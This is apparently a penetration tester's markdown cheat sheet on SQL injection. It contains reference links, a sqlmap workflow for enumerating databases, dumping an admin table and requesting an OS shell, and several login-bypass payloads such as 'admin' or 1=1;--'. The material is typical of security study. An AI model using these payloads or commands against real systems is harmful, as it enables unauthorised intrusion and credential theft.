# SQL Injection

- https://portswigger.net/web-security/sql-injection/cheat-sheet
- https://portswigger.net/web-security/sql-injection
- https://sqlwiki.netspi.com/

> MariaDB == MySQL

1. <span style="color:orange">Retrieving hidden data</span>, where you can modify an SQL query to return additional results.
2. <span style="color:orange">Subverting application logic</span>, where you can change a query to interfere with the application's logic.
3. <span style="color:orange">UNION attacks</span>, where you can retrieve data from different database tables.

   - https://portswigger.net/web-security/sql-injection/union-attacks

4. <span style="color:orange">Examining the database</span>, where you can extract information about the version and structure of the database.

   - https://portswigger.net/web-security/sql-injection/examining-the-database

5. <span style="color:orange">Blind SQL injection</span>, where the results of a query you control are not returned in the application's responses.

   - https://portswigger.net/web-security/sql-injection/blind

### tools:

- BurpSuite Intruder
- [sqlmap](https://github.com/sqlmapproject/sqlmap) - [docs](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

  - `--batch` - Never ask for user input, use the default behavior
  - `--os-shell` - Prompt for an interactive operating system shell

  1. make a request in burp suite, right click, copy (save) to file
  2. `sqlmap -r request.txt --dbs` - Enumerate DBMS databases
  3. `sqlmap -r request.txt -D users --tables` - Enumerate DBMS database tables from database -D
  4. `sqlmap -r request.txt -D users -T admin --columns` - Enumerate DBMS database tables from database -D and from table -T
  5. `sqlmap -r request.txt -D users -T admin --dump` - Dump DBMS database table entries

- TODO: ffuz
- [more...](https://github.com/The-Art-of-Hacking/h4cker/blob/master/web_application_testing/sql-injection-tools.md)

### payloads:

- https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt
- https://github.com/payloadbox/sql-injection-payload-list
- https://github.com/swisskyrepo/PayloadsAllTheThings

Tricks:

- `admin' or 1=1;--`
- `ad'||'min'/*` // concatenation in SQLite
- `SELECT username, password FROM users WHERE username='ad'||'min' AND password='a' is not 'b'`
- `SELECT username, password FROM users WHERE username='ad'||'min' except select' AND password=','' `
- `SELECT username, password FROM users WHERE username='ad'||'min' AND password=''glob'*'`

### NoSQL

- https://book.hacktricks.xyz/pentesting-web/nosql-injection

- [json to bson (byte json)](https://onlinejsontools.com/convert-json-to-bson)

- https://www.youtube.com/watch?v=o79Mlv9dROc&list=PLP91MtCof9kngegItBFcvBntWK2Mt6tWA

